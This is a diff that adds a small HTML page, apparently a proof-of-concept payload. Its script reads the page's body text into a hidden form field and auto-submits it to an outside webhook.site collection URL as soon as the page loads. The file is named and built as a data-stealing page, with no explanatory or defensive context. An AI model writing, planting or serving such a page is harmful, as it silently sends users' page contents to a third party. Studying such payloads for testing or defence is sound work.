@@ -1,0 +1,12 @@
+<!DOCTYPE html>
+<html>
+  <body>
+    <form id="steal" method="POST" action="https://webhook.site/6468aa73-bdef-4ec4-b802-e0d5084b9da6">
+      <input type="hidden" name="note" id="note">
+    </form>
+    <script>
+      document.getElementById('note').value = document.body.innerText;
+      document.getElementById('steal').submit();
+    </script>
+  </body>
+</html>
